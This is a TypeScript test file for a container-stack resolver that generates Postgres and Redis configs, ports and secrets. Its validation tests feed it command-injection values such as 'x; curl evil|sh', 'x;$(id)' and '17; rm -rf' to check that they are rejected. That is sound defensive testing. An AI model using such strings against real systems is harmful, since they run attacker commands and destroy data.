import { describe, expect, test } from "bun:test";
import type { StateFile } from "../../ports/state.port";
import { createEmptyState } from "../../ports/state.port";
import {
	builtinTestDefinitions,
	createProjectStack,
	postgresDefinition,
	redisDefinition,
} from "../../testing/catalog-fixtures";
import {
	FakePortProbe,
	FixedClock,
	InMemorySecretStore,
	InMemoryStateStore,
	SequentialSecretGenerator,
} from "../../testing/fakes";
import { provisionStack } from "../provision";
import {
	resolveStack,
	UNPROVISIONED_PORT,
	UNPROVISIONED_SECRET,
} from "../resolver";

const values = {
	POSTGRES_PASSWORD: "pg-secret-value-123",
	REDIS_PASSWORD: "redis-secret-value-456",
	SRH_TOKEN: "srh-token-value-789",
};

/** Stored secrets keyed per instance (`<INSTANCE>__<SECRET>`). */
const secrets = {
	POSTGRES__POSTGRES_PASSWORD: values.POSTGRES_PASSWORD,
	REDIS__REDIS_PASSWORD: values.REDIS_PASSWORD,
	UPSTASH_REDIS__SRH_TOKEN: values.SRH_TOKEN,
};

function pinned(stack: string, ports: Record<string, number>): StateFile {
	return {
		projects: [],
		stacks: { [stack]: { ports, createdAt: "2026-01-01T00:00:00Z" } },
	};
}

describe("resolveStack", () => {
	test("evaluates templates, config defaults and user overrides", () => {
		const stack = createProjectStack("shop", {
			postgres: {
				type: "postgres",
				version: "16",
				config: { POSTGRES_USER: "app" },
			},
		});
		const result = resolveStack({
			stack,
			definitions: builtinTestDefinitions,
			state: pinned("shop", { postgres: 5433 }),
			secrets,
		});
		if (!result.ok) throw result.error;
		const [pg] = result.value.services;
		expect(result.value.projectName).toBe("li-shop");
		expect(result.value.network).toBe("li-shop");
		expect(pg).toMatchObject({
			name: "postgres",
			type: "postgres",
			containerName: "li-shop-postgres",
			persist: "volume",
			version: "16",
			image: "postgres:16-alpine",
			hostPort: 5433,
			containerPort: 5432,
			config: { POSTGRES_USER: "app", POSTGRES_DB: "shop" },
			secrets: { POSTGRES_PASSWORD: values.POSTGRES_PASSWORD },
			env: {
				POSTGRES_USER: "app",
				POSTGRES_PASSWORD: values.POSTGRES_PASSWORD,
				POSTGRES_DB: "shop",
			},
			exports: {
				DATABASE_URL: `postgres://app:${values.POSTGRES_PASSWORD}@127.0.0.1:5433/shop`,
				PGHOST: "127.0.0.1",
				PGPORT: "5433",
			},
			volumes: [
				{
					name: "li-shop-postgres-data",
					source: "data",
					path: "/var/lib/postgresql/data",
				},
			],
			dependsOn: [],
			healthcheck: {
				test: ["CMD", "pg_isready", "-U", "app", "-d", "shop"],
				interval: "5s",
				retries: 10,
			},
		});
		expect(pg?.command).toBeUndefined();
	});

	test("dependency context exposes port, config and secrets of dependsOn", () => {
		const stack = createProjectStack("app", {
			"upstash-redis": { type: "upstash-redis" },
			redis: { type: "redis" },
		});
		const result = resolveStack({
			stack,
			definitions: builtinTestDefinitions,
			state: pinned("app", { redis: 6380, "upstash-redis": 8080 }),
			secrets,
		});
		if (!result.ok) throw result.error;
		expect(result.value.services.map((s) => s.name)).toEqual([
			"redis",
			"upstash-redis",
		]);
		const [redis, upstash] = result.value.services;
		expect(redis?.command).toEqual([
			"redis-server",
			"--requirepass",
			values.REDIS_PASSWORD,
			"--appendonly",
			"yes",
		]);
		expect(upstash?.env.SRH_CONNECTION_STRING).toBe(
			`redis://:${values.REDIS_PASSWORD}@redis:6379`,
		);
		expect(upstash?.dependsOn).toEqual(["redis"]);
	});

	test("unprovisioned port or secret is INVALID_STACK with a fix hint", () => {
		const noPort = resolveStack({
			stack: createProjectStack("app", { postgres: { type: "postgres" } }),
			definitions: builtinTestDefinitions,
			state: createEmptyState(),
			secrets,
		});
		expect(noPort.ok).toBe(false);
		if (!noPort.ok) {
			expect(noPort.error.code).toBe("INVALID_STACK");
			expect(noPort.error.details.reason).toBe("unprovisioned");
		}
		const noSecret = resolveStack({
			stack: createProjectStack("app", {
				postgres: { type: "postgres", port: 5500 },
			}),
			definitions: builtinTestDefinitions,
			state: createEmptyState(),
			secrets: {},
		});
		expect(noSecret.ok).toBe(false);
		if (!noSecret.ok) {
			expect(noSecret.error.details.reason).toBe("unprovisioned");
			expect(noSecret.error.message).not.toContain("pg-secret");
		}
	});

	test("rejects unknown config keys and invalid versions", () => {
		const base = {
			definitions: builtinTestDefinitions,
			state: pinned("app", { postgres: 5433 }),
			secrets,
		};
		const badConfig = resolveStack({
			...base,
			stack: createProjectStack("app", {
				postgres: { type: "postgres", config: { NOPE: "x" } },
			}),
		});
		expect(badConfig.ok).toBe(false);
		if (!badConfig.ok) expect(badConfig.error.code).toBe("INVALID_STACK");
		const badVersion = resolveStack({
			...base,
			stack: createProjectStack("app", {
				postgres: { type: "postgres", version: "17; rm -rf" },
			}),
		});
		expect(badVersion.ok).toBe(false);
		if (!badVersion.ok) expect(badVersion.error.code).toBe("INVALID_STACK");
	});

	test("unresolved templates are INVALID_CATALOG without leaking values", () => {
		const broken = {
			...postgresDefinition,
			exports: { URL: "{{secrets.POSTGRES_PASSWORD}}{{config.MISSING}}" },
		};
		const result = resolveStack({
			stack: createProjectStack("app", { postgres: { type: "postgres" } }),
			definitions: [broken],
			state: pinned("app", { postgres: 5433 }),
			secrets,
		});
		expect(result.ok).toBe(false);
		if (!result.ok) {
			expect(result.error.code).toBe("INVALID_CATALOG");
			expect(result.error.details.paths).toEqual(["config.MISSING"]);
			expect(result.error.message).not.toContain(values.POSTGRES_PASSWORD);
		}
	});
});

describe("provisionStack", () => {
	test("allocates, generates and resolves in one pass", async () => {
		const state = new InMemoryStateStore();
		const store = new InMemorySecretStore({
			app: { REDIS__REDIS_PASSWORD: "kept-redis-secret" },
		});
		const gen = new SequentialSecretGenerator();
		const result = await provisionStack(
			{
				state,
				secrets: store,
				probe: new FakePortProbe([6380]),
				gen,
				clock: new FixedClock(),
			},
			createProjectStack("app", {
				redis: { type: "redis" },
				"upstash-redis": { type: "upstash-redis" },
			}),
			builtinTestDefinitions,
		);
		if (!result.ok) throw result.error;
		const [redis, upstash] = result.value.services;
		expect(redis?.hostPort).toBe(6381);
		expect(redis?.secrets.REDIS_PASSWORD).toBe("kept-redis-secret");
		expect(upstash?.hostPort).toBe(8080);
		expect(upstash?.secrets.SRH_TOKEN).toStartWith("secret-1-");
		expect(gen.count).toBe(1);
		expect(state.state.stacks.app?.ports).toEqual({
			redis: 6381,
			"upstash-redis": 8080,
		});
	});
});

describe("resolveStack config patterns", () => {
	const resolveWith = (config: Record<string, string>) =>
		resolveStack({
			stack: createProjectStack("shop", {
				postgres: { type: "postgres", config },
			}),
			definitions: builtinTestDefinitions,
			state: pinned("shop", { postgres: 5433 }),
			secrets,
		});

	test("values that would break or inject into the healthcheck are INVALID_STACK", () => {
		const bad: Record<string, string>[] = [
			{ POSTGRES_DB: "my db" },
			{ POSTGRES_USER: "x;$(id)" },
			{ POSTGRES_DB: "x; curl evil|sh" },
			{ POSTGRES_USER: "a@b/c" },
		];
		for (const config of bad) {
			const result = resolveWith(config);
			expect(result.ok).toBe(false);
			if (!result.ok) {
				expect(result.error.code).toBe("INVALID_STACK");
				expect(String(result.error.details.fix)).toContain("config.");
			}
		}
	});

	test("ordinary names pass and reach the healthcheck as separate argv items", () => {
		const result = resolveWith({
			POSTGRES_USER: "app_user",
			POSTGRES_DB: "my-db",
		});
		if (!result.ok) throw result.error;
		expect(result.value.services[0]?.healthcheck?.test).toEqual([
			"CMD",
			"pg_isready",
			"-U",
			"app_user",
			"-d",
			"my-db",
		]);
	});
});

describe("resolveStack with named instances", () => {
	const shopSecrets = {
		MAIN_DB__POSTGRES_PASSWORD: "main-db-password-1",
		EVENTS__POSTGRES_PASSWORD: "events-password-22",
		SESSIONS__REDIS_PASSWORD: "sessions-password-3",
		CACHE__REDIS_PASSWORD: "cache-password-4444",
		REST__SRH_TOKEN: "rest-token-55555",
	};
	const shop = createProjectStack("shop", {
		"main-db": { type: "postgres", config: { POSTGRES_DB: "shop" } },
		events: { type: "postgres", persist: "ephemeral" },
		sessions: { type: "redis" },
		cache: { type: "redis" },
		rest: { type: "upstash-redis", uses: { redis: "cache" } },
	});
	const state = pinned("shop", {
		"main-db": 5433,
		events: 5434,
		sessions: 6380,
		cache: 6381,
		rest: 8080,
	});

	test("each instance gets its own name, container, port, secrets and volumes", () => {
		const result = resolveStack({
			stack: shop,
			definitions: builtinTestDefinitions,
			state,
			secrets: shopSecrets,
		});
		if (!result.ok) throw result.error;
		const byName = new Map(result.value.services.map((s) => [s.name, s]));
		const main = byName.get("main-db");
		const events = byName.get("events");
		expect(main).toMatchObject({
			type: "postgres",
			containerName: "li-shop-main-db",
			hostPort: 5433,
			persist: "volume",
			secrets: { POSTGRES_PASSWORD: "main-db-password-1" },
			config: { POSTGRES_DB: "shop" },
			volumes: [
				{
					name: "li-shop-main-db-data",
					source: "data",
					path: "/var/lib/postgresql/data",
				},
			],
		});
		expect(events).toMatchObject({
			type: "postgres",
			containerName: "li-shop-events",
			hostPort: 5434,
			persist: "ephemeral",
			secrets: { POSTGRES_PASSWORD: "events-password-22" },
			volumes: [],
		});
	});

	test("dependsOn resolves to the instance named by uses (host = instance name)", () => {
		const result = resolveStack({
			stack: shop,
			definitions: builtinTestDefinitions,
			state,
			secrets: shopSecrets,
		});
		if (!result.ok) throw result.error;
		const rest = result.value.services.find((s) => s.name === "rest");
		expect(rest?.dependsOn).toEqual(["cache"]);
		expect(rest?.env.SRH_CONNECTION_STRING).toBe(
			"redis://:cache-password-4444@cache:6379",
		);
	});

	test("templates see name, services.<instance> and byType.<type>", () => {
		const probe = {
			...redisDefinition,
			id: "probe",
			dependsOn: ["redis"],
			secrets: [],
			command: undefined,
			healthcheck: { test: ["CMD", "true"] },
			exports: {
				PROBE_URL:
					"{{name}}|{{byType.redis.host}}:{{byType.redis.port}}|{{services.cache.port}}",
			},
			primaryExport: "PROBE_URL",
		};
		const result = resolveStack({
			stack: createProjectStack("shop", {
				cache: { type: "redis" },
				watcher: { type: "probe" },
			}),
			definitions: [redisDefinition, probe],
			state: pinned("shop", { cache: 6381, watcher: 9000 }),
			secrets: shopSecrets,
		});
		if (!result.ok) throw result.error;
		expect(result.value.services[1]?.exports.PROBE_URL).toBe(
			"watcher|cache:6381|6381",
		);
	});

	test("placeholder mode resolves never-started services with port 0 and masked secrets", () => {
		const result = resolveStack({
			stack: createProjectStack("shop", { "main-db": { type: "postgres" } }),
			definitions: builtinTestDefinitions,
			state: createEmptyState(),
			secrets: {},
			unprovisioned: "placeholder",
		});
		if (!result.ok) throw result.error;
		const [main] = result.value.services;
		expect(main?.hostPort).toBe(UNPROVISIONED_PORT);
		expect(main?.secrets.POSTGRES_PASSWORD).toBe(UNPROVISIONED_SECRET);
		expect(main?.exports.DATABASE_URL).toBe(
			`postgres://postgres:${UNPROVISIONED_SECRET}@127.0.0.1:0/shop`,
		);
	});
});
